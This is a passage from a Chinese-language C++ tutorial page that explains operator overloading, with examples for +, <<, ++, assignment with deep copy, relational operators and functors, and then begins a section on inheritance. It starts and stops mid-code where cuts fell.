class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	goodGay  gg;</span><br><span class="line">	gg.<span class="built_in">visit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h3 id="4-5-运算符重载"><a href="#4-5-运算符重载" class="headerlink" title="4.5 运算符重载"></a>4.5 运算符重载</h3><p>运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p>
<h4 id="4-5-1-加号运算符重载"><a href="#4-5-1-加号运算符重载" class="headerlink" title="4.5.1 加号运算符重载"></a>4.5.1 加号运算符重载</h4><p>作用：实现两个自定义数据类型相加的运算</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;&#125;;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_A = a;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//成员函数实现 + 号运算符重载</span></span><br><span class="line">	Person <span class="keyword">operator</span>+(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		Person temp;</span><br><span class="line">		temp.m_A = <span class="keyword">this</span>-&gt;m_A + p.m_A;</span><br><span class="line">		temp.m_B = <span class="keyword">this</span>-&gt;m_B + p.m_B;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数实现 + 号运算符重载</span></span><br><span class="line"><span class="comment">//Person operator+(const Person&amp; p1, const Person&amp; p2) &#123;</span></span><br><span class="line"><span class="comment">//	Person temp(0, 0);</span></span><br><span class="line"><span class="comment">//	temp.m_A = p1.m_A + p2.m_A;</span></span><br><span class="line"><span class="comment">//	temp.m_B = p1.m_B + p2.m_B;</span></span><br><span class="line"><span class="comment">//	return temp;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运算符重载 可以发生函数重载 </span></span><br><span class="line">Person <span class="keyword">operator</span>+(<span class="type">const</span> Person&amp; p2, <span class="type">int</span> val)  </span><br><span class="line">&#123;</span><br><span class="line">	Person temp;</span><br><span class="line">	temp.m_A = p<span class="number">2.</span>m_A + val;</span><br><span class="line">	temp.m_B = p<span class="number">2.</span>m_B + val;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">20</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//成员函数方式</span></span><br><span class="line">	Person p3 = p2 + p1;  <span class="comment">//相当于 p2.operaor+(p1)</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p<span class="number">3.</span>m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p<span class="number">3.</span>m_B &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	Person p4 = p3 + <span class="number">10</span>; <span class="comment">//相当于 operator+(p3,10)</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p<span class="number">4.</span>m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p<span class="number">4.</span>m_B &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结1：对于内置的数据类型的表达式的的运算符是不可能改变的</p>
</blockquote>
<blockquote>
<p>总结2：不要滥用运算符重载</p>
</blockquote>
<h4 id="4-5-2-左移运算符重载"><a href="#4-5-2-左移运算符重载" class="headerlink" title="4.5.2 左移运算符重载"></a>4.5.2 左移运算符重载</h4><p>作用：可以输出自定义数据类型</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, Person&amp; p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_A = a;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//成员函数 实现不了  p &lt;&lt; cout 不是我们想要的效果</span></span><br><span class="line">	<span class="comment">//void operator&lt;&lt;(Person&amp; p)&#123;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数实现左移重载</span></span><br><span class="line"><span class="comment">//ostream对象只能有一个</span></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, Person&amp; p) &#123;</span><br><span class="line">	out &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; p.m_A &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; p.m_B;</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; p1 &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl; <span class="comment">//链式编程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：重载左移运算符配合友元可以实现输出自定义数据类型</p>
</blockquote>
<h4 id="4-5-3-递增运算符重载"><a href="#4-5-3-递增运算符重载" class="headerlink" title="4.5.3 递增运算符重载"></a>4.5.3 递增运算符重载</h4><p>作用： 通过重载递增运算符，实现自己的整型数据</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInteger</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyInteger</span>() &#123;</span><br><span class="line">		m_Num = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//前置++</span></span><br><span class="line">	MyInteger&amp; <span class="keyword">operator</span>++() &#123;</span><br><span class="line">		<span class="comment">//先++</span></span><br><span class="line">		m_Num++;</span><br><span class="line">		<span class="comment">//再返回</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//后置++</span></span><br><span class="line">	MyInteger <span class="keyword">operator</span>++(<span class="type">int</span>) &#123;</span><br><span class="line">		<span class="comment">//先返回</span></span><br><span class="line">		MyInteger temp = *<span class="keyword">this</span>; <span class="comment">//记录当前本身的值，然后让本身的值加1，但是返回的是以前的值，达到先返回后++；</span></span><br><span class="line">		m_Num++;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_Num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;</span><br><span class="line">	out &lt;&lt; myint.m_Num;</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//前置++ 先++ 再返回</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	MyInteger myInt;</span><br><span class="line">	cout &lt;&lt; ++myInt &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后置++ 先返回 再++</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	MyInteger myInt;</span><br><span class="line">	cout &lt;&lt; myInt++ &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结： 前置递增返回引用，后置递增返回值</p>
</blockquote>
<h4 id="4-5-4-赋值运算符重载"><a href="#4-5-4-赋值运算符重载" class="headerlink" title="4.5.4 赋值运算符重载"></a>4.5.4 赋值运算符重载</h4><p>c++编译器至少给一个类添加4个函数</p>
<ol>
<li>默认构造函数(无参，函数体为空)</li>
<li>默认析构函数(无参，函数体为空)</li>
<li>默认拷贝构造函数，对属性进行值拷贝</li>
<li>赋值运算符 operator&#x3D;, 对属性进行值拷贝</li>
</ol>
<p>如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//将年龄数据开辟到堆区</span></span><br><span class="line">		m_Age = <span class="keyword">new</span> <span class="built_in">int</span>(age);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重载赋值运算符 </span></span><br><span class="line">	Person&amp; <span class="keyword">operator</span>=(Person &amp;p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_Age;</span><br><span class="line">			m_Age = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//编译器提供的代码是浅拷贝</span></span><br><span class="line">		<span class="comment">//m_Age = p.m_Age;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//提供深拷贝 解决浅拷贝的问题</span></span><br><span class="line">		m_Age = <span class="keyword">new</span> <span class="built_in">int</span>(*p.m_Age);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//返回自身</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_Age;</span><br><span class="line">			m_Age = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//年龄的指针</span></span><br><span class="line">	<span class="type">int</span> *m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">18</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="number">30</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	p3 = p2 = p1; <span class="comment">//赋值操作</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1的年龄为：&quot;</span> &lt;&lt; *p<span class="number">1.</span>m_Age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2的年龄为：&quot;</span> &lt;&lt; *p<span class="number">2.</span>m_Age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p3的年龄为：&quot;</span> &lt;&lt; *p<span class="number">3.</span>m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//int a = 10;</span></span><br><span class="line">	<span class="comment">//int b = 20;</span></span><br><span class="line">	<span class="comment">//int c = 30;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//c = b = a;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h4 id="4-5-5-关系运算符重载"><a href="#4-5-5-关系运算符重载" class="headerlink" title="4.5.5 关系运算符重载"></a>4.5.5 关系运算符重载</h4><p><strong>作用：</strong>重载关系运算符，可以让两个自定义类型对象进行对比操作</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>==(Person &amp; p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="keyword">this</span>-&gt;m_Age == p.m_Age)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>!=(Person &amp; p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="keyword">this</span>-&gt;m_Age == p.m_Age)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//int a = 0;</span></span><br><span class="line">	<span class="comment">//int b = 0;</span></span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">a</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">18</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">b</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">18</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (a == b)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b不相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (a != b)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b不相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h4 id="4-5-6-函数调用运算符重载"><a href="#4-5-6-函数调用运算符重载" class="headerlink" title="4.5.6 函数调用运算符重载"></a>4.5.6 函数调用运算符重载</h4><ul>
<li>函数调用运算符 ()  也可以重载</li>
<li>由于重载后使用的方式非常像函数的调用，因此称为仿函数</li>
<li>仿函数没有固定写法，非常灵活</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(string text)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; text &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//重载的（）操作符 也称为仿函数</span></span><br><span class="line">	MyPrint myFunc;</span><br><span class="line">	<span class="built_in">myFunc</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdd</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v1 + v2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyAdd add;</span><br><span class="line">	<span class="type">int</span> ret = <span class="built_in">add</span>(<span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; ret &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//匿名对象调用  </span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;MyAdd()(100,100) = &quot;</span> &lt;&lt; <span class="built_in">MyAdd</span>()(<span class="number">100</span>, <span class="number">100</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h3 id="4-6-继承"><a href="#4-6-继承" class="headerlink" title="4.6  继承"></a>4.6  继承</h3><p><strong>继承是面向对象三大特性之一</strong></p>
<p>有些类与类之间存在特殊的关系，例如下图中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1544861202252.png"
                      alt="1544861202252"
                ></p>
<p>我们发现，定义这些类时，下级别的成员除了拥有上一级的共性，还有自己的特性。</p>
<p>这个时候我们就可以考虑利用继承的技术，减少重复代码</p>
<h4 id="4-6-1-继承的基本语法"><a href="#4-6-1-继承的基本语法" class="headerlink" title="4.6.1 继承的基本语法"></a>4.6.1 继承的基本语法</h4><p>例如我们看到很多网站中，都有公共的头部，公共的底部，甚至公共的左侧列表，只有中心内容不同</p>
<p>接下来我们分别利用普通写法和继承的写法来实现网页中的内容，看一下继承存在的意义以及好处</p>
<p><strong>普通实现：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Java</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;JAVA学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Python</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Python学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPP</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;C++学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//Java页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Java ja;</span><br><span class="line">	ja.<span class="built_in">header</span>();</span><br><span class="line">	ja.<span class="built_in">footer</span>();</span><br><span class="line">	ja.<span class="built_in">left</span>();</span><br><span class="line">	ja.<span class="built_in">content</span>();</span><br><span class="line">	cout 